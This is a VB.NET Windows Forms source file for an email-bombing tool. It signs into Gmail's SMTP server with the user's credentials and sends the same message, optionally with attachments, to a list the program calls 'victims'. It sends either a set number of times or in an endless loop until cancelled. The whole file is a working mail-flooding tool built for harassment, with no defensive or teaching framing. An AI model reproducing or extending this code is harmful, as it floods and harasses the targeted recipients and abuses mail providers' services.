Imports System.IO
Imports System.Net.Mail

Public Class Form1
    Dim MyMailMessage1 As New MailMessage()
    Dim priority, att As String
    Dim num As Integer
    Dim sendshit As Boolean = True
    Dim IsDraggingForm As Boolean = False
    Private MousePos As New System.Drawing.Point(0, 0)
    Private Sub ButtonX1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX1.Click
        Me.Close()
    End Sub
    Public Sub Form1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseDown, GroupPanel1.MouseDown, GroupPanel8.MouseDown, grouppanel7.MouseDown, GroupPanel6.MouseDown, GroupPanel5.MouseDown, GroupPanel4.MouseDown, GroupPanel3.MouseDown, Statusl.MouseDown, ReflectionLabel1.MouseDown, LabelX4.MouseDown, LabelX3.MouseDown, LabelX2.MouseDown, LabelX1.MouseDown
        If e.Button = MouseButtons.Left Then
            IsDraggingForm = True
            MousePos = e.Location
        End If
    End Sub

    Private Sub Form1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseUp, GroupPanel1.MouseUp, GroupPanel8.MouseUp, grouppanel7.MouseUp, GroupPanel6.MouseUp, GroupPanel5.MouseUp, GroupPanel4.MouseUp, GroupPanel3.MouseUp, Statusl.MouseUp, ReflectionLabel1.MouseUp, LabelX4.MouseUp, LabelX3.MouseUp, LabelX2.MouseUp, LabelX1.MouseUp
        If e.Button = MouseButtons.Left Then IsDraggingForm = False
    End Sub

    Private Sub Form1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseMove, GroupPanel1.MouseMove, GroupPanel8.MouseMove, grouppanel7.MouseMove, GroupPanel6.MouseMove, GroupPanel5.MouseMove, GroupPanel4.MouseMove, GroupPanel3.MouseMove, Statusl.MouseMove, ReflectionLabel1.MouseMove, LabelX4.MouseMove, LabelX3.MouseMove, LabelX2.MouseMove, LabelX1.MouseMove
        If IsDraggingForm Then
            Dim temp As Point = New Point(Me.Location + (e.Location - MousePos))
            Me.Location = temp
            temp = Nothing
        End If
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub RadioButton5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton5.CheckedChanged
        If RadioButton5.Checked = True Then
            AmmountInput.Enabled = True
        Else : AmmountInput.Enabled = False
        End If
    End Sub

    Private Sub Acb_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Acb.CheckedChanged
        If Acb.Checked = True Then
            lv1.Enabled = True
            ABtn1.Enabled = True
            Abtn3.Enabled = True
            ABtn2.Enabled = True
        Else
            lv1.Enabled = False
            ABtn1.Enabled = False
            ABtn2.Enabled = False
            Abtn3.Enabled = False
        End If
    End Sub

    Private Sub ABtn1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ABtn1.Click
        OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub Abtn3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Abtn3.Click
        lv1.Items.Clear()
    End Sub

    Private Sub ABtn2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ABtn2.Click
        For Each lvItem As ListViewItem In lv1.SelectedItems
            lvItem.Remove()
        Next
    End Sub

    Private Sub ButtonX5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX5.Click
        ofd2.ShowDialog()
    End Sub

    Private Sub ofd2_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles ofd2.FileOk
        Using reader As New StreamReader(ofd2.FileName)
            Do Until reader.EndOfStream
                ListViewEx2.Items.Add(reader.ReadLine())
            Loop
        End Using
    End Sub

    Private Sub ButtonX6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX6.Click
        SaveFileDialog1.ShowDialog()
    End Sub

    Private Sub SaveFileDialog1_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles SaveFileDialog1.FileOk
        Dim fs As New FileStream(SaveFileDialog1.FileName, FileMode.Create, FileAccess.Write)
        Dim s As New StreamWriter(fs)
        Dim k As Integer
        For k = 0 To ListViewEx2.Items.Count - 1
            s.WriteLine(ListViewEx2.Items(k).Text)
        Next
        s.Close()
    End Sub

    Private Sub TextBoxX4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBoxX4.TextChanged
        AcceptButton = ButtonX4
    End Sub

    Private Sub ButtonX4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX4.Click
        If TextBoxX4.Text.Contains("@") = False Then
            MessageBox.Show("Sorry, That is not a valid email address!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBoxX4.Text = ""
            Exit Sub
        End If
        ListViewEx2.Items.Add(TextBoxX4.Text)
        TextBoxX4.Text = ""
    End Sub

    Private Sub ButtonX3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX3.Click
        ListViewEx2.Items.Clear()
    End Sub

    Private Sub ButtonX2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX2.Click
        For Each lvItem As ListViewItem In ListViewEx2.SelectedItems
            lvItem.Remove()
        Next
    End Sub

    Private Sub OpenFileDialog1_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        lv1.Items.Add(OpenFileDialog1.FileName)
    End Sub

    Private Sub bg1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bg1.DoWork
        MyMailMessage1.From = New MailAddress(TextBoxX1.Text)
        MyMailMessage1.To.Add(TextBox1.Text)
        MyMailMessage1.Subject = (TextBoxX5.Text)
        MyMailMessage1.Body = (TextBoxX3.Text)
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        MyMailMessage1.Priority = priority
        SMTPServer.Credentials = New System.Net.NetworkCredential(TextBoxX1.Text, TextBoxX2.Text)
        SMTPServer.EnableSsl = True
        If RadioButton5.Checked = True Then
            Do Until num = AmmountInput.Text
                If bg1.CancellationPending Then
                    Exit Sub
                End If
                SMTPServer.Send(MyMailMessage1)
                num = num + 1
            Loop
        End If
        If RadioButton4.Checked = True Then
            Do While sendshit = True
                If bg1.CancellationPending Then
                    Exit Sub
                End If
                SMTPServer.Send(MyMailMessage1)
            Loop
        End If
    End Sub

    Public Sub done() Handles bg1.RunWorkerCompleted
        MyMailMessage1.Attachments.Clear()
        ButtonX7.Enabled = True
        ButtonX8.Enabled = False
        GroupPanel2.Enabled = True
        GroupPanel3.Enabled = True
        GroupPanel4.Enabled = True
        GroupPanel5.Enabled = True
        GroupPanel6.Enabled = True
        grouppanel7.Enabled = True
        GroupPanel8.Enabled = True

        MessageBox.Show("Done!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        Statusl.Text = "Idle"
        num = 0
    End Sub
    Private Sub ButtonX7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX7.Click
       
        If TextBoxX1.Text.Contains("@") = False Then
            MessageBox.Show(TextBoxX1.Text & " is not a valid email address!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBoxX1.Text = ""
            Exit Sub
        End If
        If TextBoxX2.Text = "" Then
            MessageBox.Show("You need to enter your password!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If ListViewEx2.Items.Count <= 0 Then
            MessageBox.Show("You need to add some victims firts!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        ButtonX8.Enabled = True
        ButtonX7.Enabled = False
        GroupPanel2.Enabled = False
        GroupPanel3.Enabled = False
        GroupPanel4.Enabled = False
        GroupPanel5.Enabled = False
        GroupPanel6.Enabled = False
        grouppanel7.Enabled = False
        GroupPanel8.Enabled = False
        Dim I As Integer
        For I = 0 To ListViewEx2.Items.Count - 1
            TextBox1.AppendText(ListViewEx2.Items(I).Text & ",")
        Next
        If Acb.Checked = True Then
            For counter = 0 To lv1.Items.Count - 1
                Statusl.Text = "Adding Attachments"
                Dim Attach As Net.Mail.Attachment = New Net.Mail.Attachment(lv1.Items(counter).Text)
                MyMailMessage1.Attachments.Add(Attach)
            Next
        End If
        If RadioButton1.Checked = True Then
            priority = MailPriority.Low
        End If
        If RadioButton2.Checked = True Then
            priority = MailPriority.Normal
        End If
        If RadioButton3.Checked = True Then
            priority = MailPriority.High
        End If
        Statusl.Text = "Working... Please Wait!"
        bg1.RunWorkerAsync()
    End Sub

    Private Sub ButtonX8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonX8.Click
        bg1.CancelAsync()
    End Sub
End Class
